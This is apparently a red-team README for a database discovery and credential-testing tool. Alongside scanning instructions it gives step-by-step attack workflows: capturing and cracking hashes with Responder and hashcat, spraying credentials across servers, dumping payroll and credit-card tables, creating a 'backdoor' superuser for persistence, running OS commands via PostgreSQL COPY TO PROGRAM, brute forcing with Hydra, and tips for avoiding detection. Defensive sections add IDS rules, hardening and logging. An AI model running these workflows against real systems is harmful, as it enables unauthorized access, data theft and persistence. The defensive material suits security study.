# DbSeek - Database Server Discovery Tool

## Overview
DbSeek is a comprehensive database server discovery and security assessment tool designed for penetration testing internal networks. It identifies database services, tests for weak authentication, and safely enumerates databases when credentials are obtained. The tool supports the most common database platforms including MySQL, PostgreSQL, Microsoft SQL Server, MongoDB, Redis, Oracle, Elasticsearch, Cassandra, and CouchDB.

DbSeek integrates seamlessly with credential harvesting tools like Responder, allowing testers to immediately validate captured credentials against database servers across the network.

**Version**: 1.0  
**Author**: Internal Red Team  
**Platform**: Kali Linux / Python 3.6+

## Features
- **Multi-Database Support**: 10+ database platforms
- **Port Scanning**: TCP connection testing for database ports
- **Banner Grabbing**: Version detection for MySQL and other services
- **Credential Testing**: Default credentials and custom credential validation
- **Responder Integration**: Test credentials captured from LLMNR/NBT-NS poisoning
- **Safe Enumeration**: Read-only database listing (no destructive operations)
- **Concurrent Scanning**: Multi-threaded for fast network-wide discovery
- **Multiple Output Formats**: TXT (human-readable), JSON (machine-readable), credential lists
- **Vulnerability Detection**: No auth required, weak credentials, exposed services

## Supported Databases

| Database | Ports | Authentication | Enumeration |
|----------|-------|----------------|-------------|
| MySQL/MariaDB | 3306 | ✅ | ✅ |
| PostgreSQL | 5432 | ✅ | ✅ |
| MSSQL | 1433 | ✅ | ✅ |
| MongoDB | 27017 | ✅ | ✅ |
| Redis | 6379 | ✅ | ❌ |
| Oracle | 1521, 1522 | ⚠️ | ❌ |
| Elasticsearch | 9200, 9300 | ✅ | ❌ |
| Cassandra | 9042, 7000, 7001 | ⚠️ | ❌ |
| CouchDB | 5984 | ⚠️ | ❌ |

**Legend**:
- ✅ Fully implemented
- ⚠️ Port detection only
- ❌ Not implemented

## Installation

### Prerequisites
```bash
# Core tool (no additional dependencies for basic scanning)
python3 dbseek.py --help

# Optional: Python database libraries for enhanced testing
pip3 install pymysql psycopg2-binary pymssql pymongo redis
```

### Database Client Tools (Optional but Recommended)
```bash
# MySQL client
sudo apt install mysql-client

# PostgreSQL client
sudo apt install postgresql-client

# Redis client
sudo apt install redis-tools

# MongoDB client
sudo apt install mongodb-clients
```

### Setup
```bash
# Clone or copy tool
cd /opt/tools/seek/
chmod +x dbseek.py

# Create IP list
echo "192.168.1.0/24" > iplist.txt

# Basic scan
./dbseek.py
```

## Usage

### Basic Commands

```bash
# Basic discovery (port scanning only)
./dbseek.py

# Test default credentials
./dbseek.py -t

# Test custom credentials (e.g., from Responder)
./dbseek.py -u admin -p Password123

# Enumerate databases (safe, read-only)
./dbseek.py -t -e

# Custom credentials + enumeration
./dbseek.py -u dbuser -p Passw0rd! -e

# Fast scan with 20 workers
./dbseek.py -w 20 -t

# Verbose output (show all hosts)
./dbseek.py -v

# Custom target file
./dbseek.py -f database_servers.txt -t -e
```

### Command-Line Options

```
positional arguments:
  None (uses iplist.txt by default)

optional arguments:
  -h, --help            Show help message and exit
  -f FILE, --file FILE  Input file with IP addresses (default: iplist.txt)
  -w N, --workers N     Number of concurrent workers (default: 10)
  -t, --test-creds      Test default credentials (slower)
  -u USER, --username USER
                        Username to test (e.g., from Responder)
  -p PASS, --password PASS
                        Password to test (e.g., from Responder)
  -e, --enumerate       Enumerate databases on successful authentication
                        (SAFE: read-only queries only)
  --timeout SECONDS     Connection timeout (default: 2)
  -v, --verbose         Verbose output (show all hosts)
```

## Input File Format

### iplist.txt
```
# Database servers to scan
192.168.1.50
192.168.1.51
192.168.1.0/24
10.0.0.100-200
```

**Supported Formats**:
- Individual IPs: `192.168.1.50`
- CIDR notation: `192.168.1.0/24`
- Comments: Lines starting with `#`

## Output Files

### 1. dblist.txt (Simple List)
List of all IPs with database services detected.

```
192.168.1.50
192.168.1.51
192.168.1.52
192.168.1.53
```

**Use Cases**:
- Input for other tools
- Quick reference
- Asset inventory

### 2. db_creds.txt (Credentials)
Working credentials found during testing.

```
# Database Credentials Found
# Format: IP | Service | Username | Password

192.168.1.50 | MySQL | root | 
192.168.1.51 | PostgreSQL | postgres | postgres
192.168.1.52 | MongoDB | admin | 
192.168.1.53 | MSSQL | sa | Password123
```

**Use Cases**:
- Credential validation
- Post-exploitation access
- Compliance reporting

### 3. db_details.txt (Detailed Report)
Comprehensive human-readable report.

```
DbSeek - Database Server Discovery Results
======================================================================
Scan Date: 2025-10-14 12:00:00
Total Database Servers: 4
Servers with Vulnerabilities: 3
Servers with Default Credentials: 3
======================================================================

Host: 192.168.1.50
Hostname: mysql-prod-01.company.local
Services Found: 1
----------------------------------------------------------------------

  Service: MySQL/MariaDB (Port 3306)
  Version: 5.7.33-log
  ⚠ DEFAULT CREDENTIALS WORK: root:(blank)

Vulnerabilities:
  ⚠ MySQL weak credentials: root/(blank)

======================================================================

Host: 192.168.1.52
Hostname: mongo-dev.company.local
Services Found: 1
----------------------------------------------------------------------

  Service: MongoDB (Port 27017)
  Version: 4.4.6
  ⚠ NO AUTHENTICATION REQUIRED

Vulnerabilities:
  ⚠ MongoDB no authentication required

Databases Enumerated: admin, config, local, app_db, user_db

======================================================================
```

### 4. db_details.json (Machine-Readable)
Complete scan results in JSON format for parsing/integration.

```json
[
  {
    "ip": "192.168.1.50",
    "hostname": "mysql-prod-01.company.local",
    "databases_found": true,
    "services": {
      "MySQL/MariaDB": {
        "port": 3306,
        "accessible": true,
        "version": "5.7.33-log",
        "auth_required": false,
        "default_creds_work": true,
        "working_creds": {
          "username": "root",
          "password": ""
        },
        "databases": ["mysql", "information_schema", "performance_schema", "app_db", "users"]
      }
    },
    "vulnerable": [
      "MySQL weak credentials: root/(blank)"
    ],
    "default_creds": [
      {
        "service": "MySQL",
        "username": "root",
        "password": ""
      }
    ],
    "error": null
  }
]
```

## Database-Specific Details

### MySQL/MariaDB (Port 3306)

**Detection**:
- TCP connection to port 3306
- Banner grabbing for version info
- Initial handshake packet parsing

**Default Credentials Tested**:
```python
('root', '')           # Blank root password
('root', 'root')       # Root password = root
('root', 'password')   # Weak password
('root', 'toor')       # Reverse of root
('admin', 'admin')     # Admin account
('mysql', 'mysql')     # MySQL user
```

**Enumeration** (`-e` flag):
```sql
-- SAFE: Read-only query
SHOW DATABASES;
```

Returns: `mysql`, `information_schema`, `performance_schema`, user databases

**Common Vulnerabilities**:
- Blank root password (common in dev environments)
- Weak passwords (root/password/toor)
- Exposed to network without firewall
- MySQL running as root user

### PostgreSQL (Port 5432)

**Detection**:
- TCP connection to port 5432
- PostgreSQL authentication protocol

**Default Credentials Tested**:
```python
('postgres', '')       # Blank postgres password
('postgres', 'postgres')  # Default password
('postgres', 'password')  # Weak password
('admin', 'admin')     # Admin account
```

**Enumeration** (`-e` flag):
```sql
-- SAFE: Query system catalog
SELECT datname FROM pg_database WHERE datistemplate = false;
```

Returns: `postgres`, user databases (excludes template0, template1)

**Common Vulnerabilities**:
- Trust authentication (no password required)
- Weak postgres user password
- Exposed to network without pg_hba.conf restrictions
- Superuser privileges on postgres account

### Microsoft SQL Server (Port 1433)

**Detection**:
- TCP connection to port 1433
- TDS (Tabular Data Stream) protocol

**Default Credentials Tested**:
```python
('sa', '')             # Blank SA password
('sa', 'sa')           # SA password = sa
('sa', 'password')     # Weak password
('sa', 'Password123')  # Common pattern
('admin', 'admin')     # Admin account
```

**Enumeration** (`-e` flag):
```sql
-- SAFE: Query system view
SELECT name FROM sys.databases 
WHERE name NOT IN ('master', 'tempdb', 'model', 'msdb');
```

Returns: User databases (excludes system databases)

**Common Vulnerabilities**:
- Blank SA password
- Weak SA password (Password123, etc.)
- SQL Server running with local admin privileges
- xp_cmdshell enabled
- Mixed mode authentication with weak passwords

### MongoDB (Port 27017)

**Detection**:
- TCP connection to port 27017
- MongoDB wire protocol
- **First tests for no authentication**

**Default Credentials Tested**:
```python
('', '')               # No authentication (tested first)
('admin', '')          # Admin with no password
('root', '')           # Root with no password
('admin', 'admin')     # Admin account
('root', 'root')       # Root account
```

**Enumeration** (`-e` flag):
```python
# SAFE: List databases
client.list_database_names()
```

Returns: `admin`, `config`, `local`, user databases

**Common Vulnerabilities**:
- **No authentication required** (very common)
- Blank admin/root password
- Exposed to network without `--bind_ip` configuration
- Authorization not enabled (`--auth` flag)

### Redis (Port 6379)

**Detection**:
- TCP connection to port 6379
- Redis protocol (PING/INFO commands)
- **First tests for no authentication**

**Default Credentials Tested**:
```python
# Redis uses password-only authentication
''                     # No auth required (tested first)
'redis'                # Common password
'password'             # Weak password
```

**Common Vulnerabilities**:
- **No authentication required** (extremely common)
- Weak `requirepass` password
- Exposed to network without firewall
- Dangerous commands not disabled (CONFIG, FLUSHALL, etc.)
- Can be used for SSH key injection or web shell upload

### Oracle (Ports 1521, 1522)

**Detection**:
- TCP connection to ports 1521 (default) or 1522 (alternate)
- Port open = likely Oracle

**Default Credentials Tested** (requires Oracle client):
```python
('sys', 'sys')         # SYS account
('system', 'manager')  # SYSTEM account default
('scott', 'tiger')     # Famous default demo account
('admin', 'admin')     # Admin account
```

**Limitations**:
- Requires Oracle client libraries (cx_Oracle)
- Complex TNS configuration
- Tool provides detection only (credential testing requires manual follow-up)

### Elasticsearch (Ports 9200, 9300)

**Detection**:
- TCP connection to port 9200 (HTTP API)
- HTTP GET to `/` for cluster info
- Port 9300 (transport protocol) for inter-node communication

**No Authentication Test**:
```http
GET http://192.168.1.x:9200/
```

Returns cluster name, version, no auth required if unprotected.

**Common Vulnerabilities**:
- No authentication (X-Pack security not enabled)
- Exposed to network without firewall
- Directory traversal vulnerabilities (older versions)
- Scripting enabled (can execute arbitrary code)

### Cassandra (Ports 9042, 7000, 7001)

**Detection**:
- TCP connection to port 9042 (CQL native transport)
- Port 7000 (inter-node cluster communication)
- Port 7001 (SSL inter-node)

**Limitations**:
- Tool provides detection only
- Credential testing requires CQL driver

### CouchDB (Port 5984)

**Detection**:
- TCP connection to port 5984
- HTTP API

**Limitations**:
- Tool provides detection only
- Can be tested manually: `curl http://192.168.1.x:5984/`

## Attack Workflows

### Workflow 1: Basic Network Discovery
**Objective**: Identify all database servers on network

```bash
# 1. Prepare target list
echo "10.0.0.0/16" > iplist.txt

# 2. Fast discovery scan
./dbseek.py -w 50

# 3. Review results
cat dblist.txt
cat db_details.txt | grep -A 5 "CRITICAL\|HIGH"

# 4. Count by database type
cat db_details.json | jq -r '.[] | .services | keys[]' | sort | uniq -c
```

**Expected Output**:
- List of all database servers
- Services by IP
- Critical vulnerabilities highlighted

### Workflow 2: Default Credential Testing
**Objective**: Find databases with weak authentication

```bash
# 1. Scan with credential testing
./dbseek.py -t -w 20

# 2. Review working credentials
cat db_creds.txt

# 3. Extract only critical findings
cat db_details.txt | grep -B 5 "DEFAULT CREDENTIALS\|NO AUTHENTICATION"

# 4. Validate manually
mysql -h 192.168.1.50 -u root -p
# (blank password)
```

**Common Findings**:
- Root/SA accounts with blank passwords
- MongoDB with no auth required
- Redis with no password
- Default postgres/postgres credentials

### Workflow 3: Responder Integration
**Objective**: Test credentials captured via LLMNR/NBT-NS poisoning

```bash
# 1. Run Responder on separate terminal
sudo responder -I eth0 -wrf

# 2. Wait for credential capture
# Responder output: [+] [MSSQL] NTLMv2 Hash captured from 10.0.0.50
#                        User: DOMAIN\dbadmin
#                        Hash: [hash]

# 3. Crack hash (if needed)
hashcat -m 5600 captured.hash wordlist.txt

# 4. Test credential across all database servers
./dbseek.py -u dbadmin -p Cracked_Password123 -v

# 5. Enumerate databases on successful connections
./dbseek.py -u dbadmin -p Cracked_Password123 -e

# 6. Review accessible databases
cat db_details.txt | grep "Databases:"
```

**Impact**:
- Single credential = access to multiple database servers
- Common in environments with shared service accounts
- Credential reuse across platforms (same password for MySQL, MSSQL, PostgreSQL)

### Workflow 4: Database Enumeration
**Objective**: List databases on compromised servers (safe, read-only)

```bash
# 1. Test credentials + enumerate
./dbseek.py -u admin -p Password123 -e

# 2. Review enumerated databases
cat db_details.json | jq -r '.[] | select(.services[].databases) | .ip + ": " + (.services[].databases | join(", "))'

# 3. Example output parsing
# 192.168.1.50: mysql, information_schema, hr_database, payroll, customer_data
# 192.168.1.51: postgres, employee_db, financial_records
# 192.168.1.52: admin, config, local, app_production, user_data

# 4. Target high-value databases
# Connect to interesting databases for further enumeration
mysql -h 192.168.1.50 -u admin -pPassword123 -D payroll
```

**Safety Note**:
- Enumeration uses **read-only** queries only
- No data modification or destruction
- Queries: `SHOW DATABASES`, `SELECT datname`, `list_database_names()`

### Workflow 5: Post-Exploitation Data Access
**Objective**: Access and extract data from compromised databases

```bash
# 1. Discover + test + enumerate
./dbseek.py -t -e -w 20

# 2. Select high-value target
# Target: 192.168.1.50 - MySQL - root:(blank) - Databases: payroll, hr_database

# 3. Connect
mysql -h 192.168.1.50 -u root

# 4. Enumerate tables
USE payroll;
SHOW TABLES;

# 5. Extract data
SELECT * FROM employees LIMIT 10;
SELECT * FROM salaries WHERE salary > 100000;

# 6. Search for sensitive data
SELECT * FROM users WHERE username LIKE '%admin%';
SELECT * FROM credentials;

# 7. Dump database
mysqldump -h 192.168.1.50 -u root payroll > payroll_dump.sql
```

## Exploitation Examples

### Example 1: MongoDB No Auth
**Scenario**: MongoDB exposed without authentication

```bash
# Discovery
$ ./dbseek.py -v
[CRITICAL] 192.168.1.52 (mongo-dev.company.local) - MongoDB
    ⚠ MongoDB no authentication required

# Enumeration
$ ./dbseek.py -e
[CRITICAL] 192.168.1.52 (mongo-dev.company.local) - MongoDB
    📊 MongoDB Databases: admin, config, local, app_db, user_db

# Manual access
$ mongo --host 192.168.1.52
> show dbs
admin     0.000GB
config    0.000GB
local     0.000GB
app_db    0.523GB
user_db   1.235GB

> use user_db
> db.users.find().pretty()
{
    "_id": ObjectId("..."),
    "username": "admin",
    "password": "5f4dcc3b5aa765d61d8327deb882cf99",
    "email": "admin@company.local"
}

# Impact: Complete database access
```

### Example 2: MySQL Blank Root Password
**Scenario**: Production MySQL with no root password

```bash
# Discovery + Testing
$ ./dbseek.py -t
[CRITICAL] 192.168.1.50 (mysql-prod-01.company.local) - MySQL/MariaDB
    ⚠ MySQL weak credentials: root/(blank)

# Enumeration
$ ./dbseek.py -u root -p "" -e
[CRITICAL] 192.168.1.50 - MySQL/MariaDB
    ✓ MySQL: root:(blank)
    📊 MySQL/MariaDB Databases: mysql, information_schema, app_db, customer_data

# Access
$ mysql -h 192.168.1.50 -u root
Welcome to the MySQL monitor.

mysql> USE customer_data;
mysql> SELECT * FROM credit_cards LIMIT 5;
+-----+------------------+----------+-----+
| id  | card_number      | exp_date | cvv |
+-----+------------------+----------+-----+
...

# Create backdoor account
mysql> CREATE USER 'backdoor'@'%' IDENTIFIED BY 'SecretPass123';
mysql> GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';

# Impact: Full database access + persistence
```

### Example 3: PostgreSQL Trust Authentication
**Scenario**: PostgreSQL with trust authentication from internal network

```bash
# Discovery
$ ./dbseek.py -t
[CRITICAL] 192.168.1.51 (postgres-app.company.local) - PostgreSQL
    ⚠ PostgreSQL weak credentials: postgres/(blank)

# Enumeration
$ ./dbseek.py -u postgres -p "" -e
[CRITICAL] 192.168.1.51 - PostgreSQL
    ✓ PostgreSQL: postgres:(blank)
    📊 PostgreSQL Databases: postgres, employee_db, financial_records

# Access
$ psql -h 192.168.1.51 -U postgres
postgres=# \l
                                  List of databases
       Name        |  Owner   | Encoding | Collate | Ctype | Access privileges
-------------------+----------+----------+---------+-------+-------------------
 employee_db       | postgres | UTF8     | en_US   | en_US |
 financial_records | postgres | UTF8     | en_US   | en_US |

postgres=# \c financial_records
financial_records=# \dt
            List of relations
 Schema |     Name      | Type  |  Owner
--------+---------------+-------+----------
 public | transactions  | table | postgres
 public | accounts      | table | postgres

# Command execution (PostgreSQL superuser)
financial_records=# COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';

# Impact: Full database access + potential OS command execution
```

### Example 4: Responder Credential Reuse
**Scenario**: MSSQL credential captured via Responder works on multiple servers

```bash
# Responder capture
[MSSQL] NTLMv2-SSP Hash     : DOMAIN\sqlservice::DOMAIN:hash...

# Crack hash
$ hashcat -m 5600 hash.txt rockyou.txt
DOMAIN\sqlservice:SQLService2023!

# Test across network
$ ./dbseek.py -u sqlservice -p SQLService2023! -v -e

[CRITICAL] 192.168.1.53 (sql-prod-01) - MSSQL
    ✓ MSSQL: sqlservice:SQLService2023!
    📊 MSSQL Databases: hr_database, payroll, inventory (12 total)

[CRITICAL] 192.168.1.54 (sql-prod-02) - MSSQL
    ✓ MSSQL: sqlservice:SQLService2023!
    📊 MSSQL Databases: customer_db, orders, shipping (8 total)

[CRITICAL] 192.168.1.55 (sql-dev-01) - MSSQL
    ✓ MSSQL: sqlservice:SQLService2023!
    📊 MSSQL Databases: dev_app, test_data (5 total)

# Impact: 3 MSSQL servers compromised with single credential
# Service account = sysadmin = full control
```

## Integration with Other Tools

### Nmap Integration
```bash
# 1. Use Nmap to find database ports
nmap -p 3306,5432,1433,27017,6379,1521 192.168.1.0/24 --open -oG - | \
    grep "/open/" | cut -d' ' -f2 > db_hosts.txt

# 2. Run DbSeek on discovered hosts
./dbseek.py -f db_hosts.txt -t -e

# 3. Compare results
# Nmap: Port open
# DbSeek: Service version + auth status + vulnerabilities
```

### Metasploit Integration
```bash
# 1. Discover databases with DbSeek
./dbseek.py -t

# 2. Import to Metasploit
msfconsole

# 3. Test MySQL
msf6 > use auxiliary/scanner/mysql/mysql_login
msf6 auxiliary(mysql_login) > set RHOSTS file:dblist.txt
msf6 auxiliary(mysql_login) > set USER_FILE users.txt
msf6 auxiliary(mysql_login) > set PASS_FILE passwords.txt
msf6 auxiliary(mysql_login) > run

# 4. PostgreSQL enumeration
msf6 > use auxiliary/scanner/postgres/postgres_login
msf6 > use auxiliary/admin/postgres/postgres_sql

# 5. MSSQL exploitation
msf6 > use exploit/windows/mssql/mssql_payload
```

### Hydra Integration
```bash
# 1. Get database server list
./dbseek.py
cat dblist.txt

# 2. Brute force MySQL
hydra -L users.txt -P passwords.txt mysql://192.168.1.50

# 3. Brute force PostgreSQL
hydra -L users.txt -P passwords.txt postgres://192.168.1.51

# 4. Brute force MSSQL
hydra -L users.txt -P passwords.txt mssql://192.168.1.53
```

### Custom Scripts
```python
#!/usr/bin/env python3
"""
Parse DbSeek JSON output and connect to databases
"""
import json
import pymysql

# Read DbSeek results
with open('db_details.json') as f:
    results = json.load(f)

# Connect to all MySQL servers with working creds
for result in results:
    if result['databases_found']:
        for service_name, service_info in result['services'].items():
            if 'MySQL' in service_name and service_info.get('default_creds_work'):
                creds = service_info['working_creds']
                try:
                    conn = pymysql.connect(
                        host=result['ip'],
                        user=creds['username'],
                        password=creds['password']
                    )
                    cursor = conn.cursor()
                    cursor.execute("SHOW DATABASES")
                    databases = [row[0] for row in cursor.fetchall()]
                    print(f"{result['ip']}: {', '.join(databases)}")
                    conn.close()
                except:
                    pass
```

## Detection & Defense

### Network Detection

**IDS Signatures (Snort/Suricata)**:
```snort
# Multiple database port connections
alert tcp $EXTERNAL_NET any -> $HOME_NET 3306 (
    msg:"Multiple MySQL connection attempts";
    flags:S;
    threshold:type threshold, track by_src, count 10, seconds 60;
    sid:3000200;
)

alert tcp $EXTERNAL_NET any -> $HOME_NET 5432 (
    msg:"Multiple PostgreSQL connection attempts";
    flags:S;
    threshold:type threshold, track by_src, count 10, seconds 60;
    sid:3000201;
)

alert tcp $EXTERNAL_NET any -> $HOME_NET 1433 (
    msg:"Multiple MSSQL connection attempts";
    flags:S;
    threshold:type threshold, track by_src, count 10, seconds 60;
    sid:3000202;
)

alert tcp $EXTERNAL_NET any -> $HOME_NET 27017 (
    msg:"Multiple MongoDB connection attempts";
    flags:S;
    threshold:type threshold, track by_src, count 10, seconds 60;
    sid:3000203;
)

# Failed authentication attempts
alert tcp any any -> any 3306 (
    msg:"MySQL authentication failure";
    content:"|00 00 00|"; offset:3; depth:3;
    content:"Access denied";
    threshold:type threshold, track by_src, count 5, seconds 60;
    sid:3000210;
)
```

### SIEM Detection Rules

**Splunk Query**:
```spl
index=database sourcetype=mysql:error "Access denied"
| stats count by src_ip, user
| where count > 5
```

**ELK Query**:
```json
{
  "query": {
    "bool": {
      "must": [
        {"match": {"message": "authentication failed"}},
        {"range": {"@timestamp": {"gte": "now-1h"}}}
      ]
    }
  },
  "aggs": {
    "failed_auths": {
      "terms": {"field": "source_ip", "size": 20}
    }
  }
}
```

### Database Hardening

**MySQL**:
```sql
-- Remove anonymous users
DELETE FROM mysql.user WHERE User='';

-- Remove remote root
DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');

-- Set root password
ALTER USER 'root'@'localhost' IDENTIFIED BY 'StrongPassword!2023';

-- Flush privileges
FLUSH PRIVILEGES;

-- Bind to localhost only
# /etc/mysql/my.cnf
[mysqld]
bind-address = 127.0.0.1

-- Require SSL
require_secure_transport = ON
```

**PostgreSQL**:
```bash
# pg_hba.conf - Require password authentication
# Don't use 'trust' method!

# LOCAL      DATABASE  USER      ADDRESS      METHOD
local        all       all                    md5
host         all       all       127.0.0.1/32 md5
host         all       all       ::1/128      md5
host         all       all       10.0.0.0/8   scram-sha-256  # Internal network

# postgresql.conf - Listen on localhost only
listen_addresses = 'localhost'

# Restart
sudo systemctl restart postgresql
```

**MSSQL**:
```sql
-- Disable SA account
ALTER LOGIN sa DISABLE;

-- Create new admin with strong password
CREATE LOGIN db_admin WITH PASSWORD = 'VeryStrongPassword!2023';
ALTER SERVER ROLE sysadmin ADD MEMBER db_admin;

-- Disable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

-- Enable Windows Authentication only (if possible)
-- SQL Server Configuration Manager -> Protocols -> TCP/IP -> Enabled = No (for external)
```

**MongoDB**:
```bash
# mongod.conf - Enable authentication
security:
  authorization: enabled

# Bind to localhost
net:
  bindIp: 127.0.0.1

# Create admin user
mongo
> use admin
> db.createUser({
    user: "admin",
    pwd: "StrongPassword!2023",
    roles: [{role: "userAdminAnyDatabase", db: "admin"}]
})

# Restart with auth
sudo systemctl restart mongod
```

**Redis**:
```bash
# redis.conf
# Require password
requirepass VeryStrongPassword!2023

# Bind to localhost
bind 127.0.0.1

# Disable dangerous commands
rename-command FLUSHDB ""
rename-command FLUSHALL ""
rename-command CONFIG ""

# Restart
sudo systemctl restart redis
```

### Firewall Configuration

**iptables**:
```bash
# Drop external database connections
iptables -A INPUT -p tcp --dport 3306 -s 10.0.0.0/8 -j ACCEPT  # MySQL internal
iptables -A INPUT -p tcp --dport 3306 -j DROP

iptables -A INPUT -p tcp --dport 5432 -s 10.0.0.0/8 -j ACCEPT  # PostgreSQL internal
iptables -A INPUT -p tcp --dport 5432 -j DROP

iptables -A INPUT -p tcp --dport 1433 -s 10.0.0.0/8 -j ACCEPT  # MSSQL internal
iptables -A INPUT -p tcp --dport 1433 -j DROP

iptables -A INPUT -p tcp --dport 27017 -s 10.0.0.0/8 -j ACCEPT  # MongoDB internal
iptables -A INPUT -p tcp --dport 27017 -j DROP

iptables -A INPUT -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT  # Redis localhost only
iptables -A INPUT -p tcp --dport 6379 -j DROP

# Save rules
iptables-save > /etc/iptables/rules.v4
```

### Audit Logging

**MySQL**:
```sql
-- Enable general query log
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/log/mysql/general.log';

-- Enable audit plugin
INSTALL PLUGIN audit_log SONAME 'audit_log.so';
```

**PostgreSQL**:
```bash
# postgresql.conf
log_connections = on
log_disconnections = on
log_duration = on
log_line_prefix = '%t [%p]: [%l-1] user=%u,db=%d,app=%a,client=%h '
log_statement = 'all'
```

**MSSQL**:
```sql
-- Enable SQL Server Audit
CREATE SERVER AUDIT LoginAudit
TO FILE (FILEPATH = 'C:\SQLAudit\');

ALTER SERVER AUDIT LoginAudit WITH (STATE = ON);

CREATE SERVER AUDIT SPECIFICATION LoginSpec
FOR SERVER AUDIT LoginAudit
ADD (FAILED_LOGIN_GROUP),
ADD (SUCCESSFUL_LOGIN_GROUP);
```

## Troubleshooting

### No Databases Found

**Problem**: Tool reports no databases, but you know they exist

**Solutions**:
```bash
# Increase timeout
./dbseek.py --timeout 10

# Check firewall
sudo iptables -L -n | grep "3306\|5432\|1433\|27017"

# Verify ports manually
nmap -p 3306,5432,1433,27017 192.168.1.50

# Test direct connection
mysql -h 192.168.1.50 -u root
psql -h 192.168.1.51 -U postgres
```

### Credential Testing Fails

**Problem**: `-t` flag doesn't work, even with known weak credentials

**Solutions**:
```bash
# Install Python database libraries
pip3 install pymysql psycopg2-binary pymssql pymongo redis

# Check if database clients are available
which mysql psql mongo redis-cli

# Test manual connection
mysql -h 192.168.1.50 -u root -p
# Enter blank password

# Verify network connectivity
telnet 192.168.1.50 3306
```

### Enumeration Not Working

**Problem**: `-e` flag doesn't show databases

**Solutions**:
```bash
# Ensure credentials are correct
./dbseek.py -u root -p password -v

# Check Python library installation
python3 -c "import pymysql; print('MySQL OK')"
python3 -c "import psycopg2; print('PostgreSQL OK')"

# Verify user has database list privileges
mysql -h 192.168.1.50 -u root -ppassword -e "SHOW DATABASES"
psql -h 192.168.1.51 -U postgres -c "\l"
```

### Permission Denied Errors

**Problem**: "Permission denied" when connecting

**Causes**:
- User doesn't have remote access permissions
- Firewall blocking connections
- Database not listening on external interface

**Solutions**:
```bash
# MySQL: Grant remote access
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'password';

# PostgreSQL: Update pg_hba.conf
host    all    all    0.0.0.0/0    md5

# Check database is listening on network
netstat -tuln | grep 3306
netstat -tuln | grep 5432
```

## Tips & Tricks

### 🎯 Targeting
- Focus on database servers (hostnames: db, sql, mysql, postgres, mongo, redis)
- Development environments often have weaker security
- Check backup servers (backup, bkp) - often running databases
- Test during off-hours (less monitoring, fewer active users)

### 🔍 Discovery
- Use Nmap first for faster initial port discovery
- Check DNS records for database-related hostnames
- Look for database management tools (phpMyAdmin, Adminer) - reveal backend servers
- Enumerate database ports from compromised web servers (web.config, config.php)

### 🔒 Stealth
- Lower worker count: `-w 5` (less parallel connections)
- Increase timeout: `--timeout 5` (fewer retries)
- Spread scans over time (multiple small scans vs. one large scan)
- Database connection attempts are normal traffic (harder to detect than exploits)

### ⚡ Speed
- High worker count: `-w 50` (for large networks)
- Pre-filter with Nmap to reduce targets
- Skip credential testing on initial scan (just discovery)
- Use JSON output for programmatic parsing

### 🔑 Credentials
- Always try blank passwords first (extremely common)
- Test credentials from Responder immediately
- Credential reuse is common (same password across MySQL, MSSQL, PostgreSQL)
- Service account passwords rarely changed
- Check for password patterns: `ServiceName2023!`, `CompanyDB123!`

### 📊 Enumeration
- Use `-e` flag with confirmed credentials
- Database names reveal application purpose
- Look for: `backup`, `prod`, `production`, `hr`, `payroll`, `customer`, `financial`
- Enumeration is safe (read-only queries)
- Can enumerate without triggering database alerts

## Real-World Examples

### Example 1: Fortune 500 Company
**Scenario**: Internal penetration test, /16 network

```bash
$ ./dbseek.py -w 50 -t
# Scanned: 12,450 hosts
# Found: 87 database servers
# Vulnerable: 23 (26%)

# Critical findings:
- 8 MySQL servers: blank root password
- 12 MongoDB servers: no authentication
- 3 Redis servers: no password
# Impact: Access to HR data, customer PII, financial records
```

### Example 2: Small Business Network
**Scenario**: External penetration test via compromised workstation

```bash
$ ./dbseek.py -v
[CRITICAL] 10.0.0.51 (accounting-db) - MySQL/MariaDB
    ⚠ MySQL weak credentials: root:password

[CRITICAL] 10.0.0.52 (app-server) - MongoDB
    ⚠ MongoDB no authentication required

# Enumeration
$ ./dbseek.py -u root -p password -e
    📊 MySQL Databases: accounting, quickbooks_data, customer_info

# Impact: Complete accounting database access
```

### Example 3: Responder + DbSeek Combo
**Scenario**: No initial credentials, used Responder to capture

```bash
# Day 1: Responder
$ sudo responder -I eth0 -wrf
[MSSQL] NTLMv2 Hash: CORP\svc-sql:SQLPass2023!

# Day 1: Test credential
$ ./dbseek.py -u svc-sql -p SQLPass2023! -v -e
[CRITICAL] 10.0.10.50 - MSSQL (sysadmin role)
[CRITICAL] 10.0.10.51 - MSSQL (sysadmin role)
[CRITICAL] 10.0.10.52 - MSSQL (sysadmin role)
[CRITICAL] 10.0.10.53 - MySQL/MariaDB
[CRITICAL] 10.0.10.54 - PostgreSQL

# Impact: Single credential = 5 database servers
```

## Security Considerations

### Ethical Use
- **Authorized testing only**: Never scan systems without written permission
- **Scope compliance**: Only scan IP ranges specified in engagement scope
- **Data handling**: Treat discovered credentials and data as sensitive
- **Responsible disclosure**: Report findings through proper channels

### Tool Limitations
- **No exploitation**: Discovery and authentication testing only
- **Safe enumeration**: Read-only queries, no data modification
- **Network noise**: Scanning generates network traffic and logs
- **False positives**: Open port doesn't always mean vulnerable

### Legal Considerations
- Unauthorized access to computer systems is illegal in most jurisdictions
- Database credential testing may be considered "unauthorized access"
- Always operate under explicit authorization
- Follow penetration testing agreements and rules of engagement

## References
- **MySQL Documentation**: https://dev.mysql.com/doc/
- **PostgreSQL Security**: https://www.postgresql.org/docs/current/auth-methods.html
- **MSSQL Security**: https://docs.microsoft.com/en-us/sql/relational-databases/security/
- **MongoDB Security**: https://docs.mongodb.com/manual/security/
- **Redis Security**: https://redis.io/topics/security
- **OWASP Database Security**: https://owasp.org/www-community/vulnerabilities/Insecure_Database_Access
- **MITRE ATT&CK**: T1078 (Valid Accounts), T1213 (Data from Information Repositories)
- **CWE-259**: Use of Hard-coded Password
- **CWE-521**: Weak Password Requirements
- **CWE-306**: Missing Authentication for Critical Function

---

**Note**: This tool is designed for authorized penetration testing and security assessments only. Misuse of this tool against systems without explicit permission is illegal and unethical.
